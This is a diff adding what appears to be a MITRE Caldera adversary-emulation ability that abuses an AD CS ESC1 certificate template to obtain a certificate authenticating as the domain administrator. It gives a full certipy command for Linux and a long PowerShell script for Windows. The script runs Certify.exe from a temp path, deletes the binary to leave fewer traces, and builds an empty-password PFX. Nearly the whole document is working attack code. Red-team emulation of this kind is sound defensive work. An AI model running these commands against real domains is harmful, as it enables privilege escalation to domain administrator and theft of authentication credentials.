@@ -1,0 +1,35 @@
+- id: eabc40cb-d298-4a93-9c1c-d4897721dfd9
+  name: 'ADCS ESC1: Request Certificate as Administrator'
+  description: |
+    Abuse an ESC1 template (enrollee-supplied SAN + client authentication) to request a certificate that authenticates as the domain administrator. Same ability on both Linux (certipy) and Windows (Certify), both emitting esc.cert.pfx.
+
+    Windows executor: Certify.exe is delivered via the Caldera payload system. The executor reads the bytes, immediately deletes the delivered file, writes to a random temp path, and runs Certify as a child process via [Diagnostics.Process]::Start() with stdout redirected. The temp binary is deleted after the process exits. The PEM output (PKCS#1 RSA key + certificate) is parsed in-process into RSAParameters via manual DER parsing (the .NET 5+ ImportFromPem methods do not exist on .NET Framework 4.8) and exported as an empty-password PFX for the auth ability to consume.
+
+    Linux: certipy req with -upn administrator. Same esc.cert.pfx fact.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1649
+    name: Steal or Forge Authentication Certificates
+  platforms:
+    linux:
+      sh:
+        command: |
+          cd /tmp; rm -f "adcs_esc1_#{esc1.template.name}.pfx" "adcs_esc1_#{esc1.template.name}.log"; certipy req -u '#{esc.domain.user}@#{esc.domain.fqdn}' -p '#{esc.domain.password}' -dc-ip '#{esc.domain.dc_ip}' -target '#{esc.ca.host}' -target-ip '#{esc.ca.ip}' -ca '#{esc1.ca.name}' -template '#{esc1.template.name}' -upn 'administrator@#{esc.domain.fqdn}' -out "adcs_esc1_#{esc1.template.name}" >"adcs_esc1_#{esc1.template.name}.log" 2>&1; [ -f "/tmp/adcs_esc1_#{esc1.template.name}.pfx" ] || { echo "ESC1 FAILED: no certificate issued from template #{esc1.template.name} on CA #{esc1.ca.name}" >&2; cat "adcs_esc1_#{esc1.template.name}.log" >&2; exit 1; }; echo "/tmp/adcs_esc1_#{esc1.template.name}.pfx"
+        cleanup: |
+          rm -f "/tmp/adcs_esc1_#{esc1.template.name}.pfx" "/tmp/adcs_esc1_#{esc1.template.name}.log"
+        timeout: 300
+        parsers:
+          plugins.stockpile.app.parsers.esc_pfx:
+          - source: esc.cert.pfx
+    windows:
+      psh:
+        command: |
+          $cwd=[IO.Directory]::GetCurrentDirectory(); $tpl='#{esc1.template.name}'; $pfxPath=Join-Path $cwd ('adcs_esc1_'+$tpl+'.pfx'); Remove-Item $pfxPath -EA SilentlyContinue; $cp=Join-Path $cwd 'Certify.exe'; $cb=[IO.File]::ReadAllBytes($cp); Remove-Item $cp -Force -EA SilentlyContinue; $bf=[IO.Path]::GetTempFileName(); [IO.File]::WriteAllBytes($bf,$cb); $cb=$null; $tf=[IO.Path]::GetTempFileName(); $certArgs=@("request","/ca:#{esc.ca.host}\#{esc1.ca.name}","/template:$tpl","/altname:administrator"); $j=Start-Job -ScriptBlock {param([string]$bfile,[string[]]$a,[string]$tfile) $psi=New-Object Diagnostics.ProcessStartInfo($bfile,($a -join ' ')); $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $psi.UseShellExecute=$false; $psi.CreateNoWindow=$true; $proc=[Diagnostics.Process]::Start($psi); $stdout=$proc.StandardOutput.ReadToEnd(); $proc.WaitForExit(); Remove-Item $bfile -Force -EA SilentlyContinue; [IO.File]::WriteAllText($tfile,$stdout)} -ArgumentList $bf,$certArgs,$tf; Wait-Job $j|Out-Null; Remove-Job $j; Remove-Item $bf -Force -EA SilentlyContinue; $pem=[IO.File]::ReadAllText($tf); Remove-Item $tf -Force; $km=[regex]::Match($pem,'(?s)-----BEGIN RSA PRIVATE KEY-----(.*?)-----END RSA PRIVATE KEY-----'); $cm=[regex]::Match($pem,'(?s)-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----'); if(-not $km.Success -or -not $cm.Success){ Write-Error 'ESC1 WINDOWS FAILED: Certify returned no PEM.'; Write-Output $pem; exit 1 }; $keyDer=[Convert]::FromBase64String(($km.Groups[1].Value -replace '\s','')); $certDer=[Convert]::FromBase64String(($cm.Groups[1].Value -replace '\s','')); function Read-DerLength { param([byte[]]$Data,[ref]$Offset) $first=$Data[$Offset.Value]; $Offset.Value++; if($first -lt 0x80){ return $first }; $numBytes=$first -band 0x7F; $len=0; for($i=0;$i -lt $numBytes;$i++){ $len=($len -shl 8) -bor $Data[$Offset.Value]; $Offset.Value++ }; return $len }; function Read-DerInteger { param([byte[]]$Data,[ref]$Offset) if($Data[$Offset.Value] -ne 0x02){ throw 'bad INTEGER' }; $Offset.Value++; $len=Read-DerLength -Data $Data -Offset $Offset; $bytes=New-Object byte[] $len; [Array]::Copy($Data,$Offset.Value,$bytes,0,$len); $Offset.Value+=$len; if($bytes.Length -gt 1 -and $bytes[0] -eq 0x00){ $tmp2=New-Object byte[] ($bytes.Length-1); [Array]::Copy($bytes,1,$tmp2,0,$tmp2.Length); $bytes=$tmp2 }; return ,$bytes }; function Pad-Left { param([byte[]]$Bytes,[int]$Length) if($Bytes.Length -eq $Length){ return ,$Bytes }; if($Bytes.Length -gt $Length){ throw 'too long' }; $out=New-Object byte[] $Length; [Array]::Copy($Bytes,0,$out,$Length-$Bytes.Length,$Bytes.Length); return ,$out }; $off=[ref]0; if($keyDer[$off.Value] -ne 0x30){ throw 'not SEQUENCE' }; $off.Value++; [void](Read-DerLength -Data $keyDer -Offset $off); [void](Read-DerInteger -Data $keyDer -Offset $off); $n=Read-DerInteger -Data $keyDer -Offset $off; $e=Read-DerInteger -Data $keyDer -Offset $off; $d=Read-DerInteger -Data $keyDer -Offset $off; $p=Read-DerInteger -Data $keyDer -Offset $off; $q=Read-DerInteger -Data $keyDer -Offset $off; $dp=Read-DerInteger -Data $keyDer -Offset $off; $dq=Read-DerInteger -Data $keyDer -Offset $off; $qi=Read-DerInteger -Data $keyDer -Offset $off; $ml=$n.Length; $hl=[int][Math]::Ceiling($ml/2.0); $rp=New-Object System.Security.Cryptography.RSAParameters; $rp.Modulus=Pad-Left -Bytes $n -Length $ml; $rp.Exponent=$e; $rp.D=Pad-Left -Bytes $d -Length $ml; $rp.P=Pad-Left -Bytes $p -Length $hl; $rp.Q=Pad-Left -Bytes $q -Length $hl; $rp.DP=Pad-Left -Bytes $dp -Length $hl; $rp.DQ=Pad-Left -Bytes $dq -Length $hl; $rp.InverseQ=Pad-Left -Bytes $qi -Length $hl; $rsa=New-Object System.Security.Cryptography.RSACryptoServiceProvider; $rsa.ImportParameters($rp); $cert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$certDer); $ck=[System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($cert,$rsa); $bytes=$ck.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx,''); [System.IO.File]::WriteAllBytes($pfxPath,$bytes); if(Test-Path $pfxPath){ Write-Output $pfxPath } else { Write-Error 'ESC1 WINDOWS FAILED: PFX not written'; exit 1 }
+        cleanup: |
+          $cwd=[IO.Directory]::GetCurrentDirectory(); Remove-Item -EA SilentlyContinue (Join-Path $cwd ('adcs_esc1_#{esc1.template.name}.pfx'))
+        timeout: 300
+        parsers:
+          plugins.stockpile.app.parsers.esc_pfx:
+          - source: esc.cert.pfx
+        payloads:
+        - Certify.exe
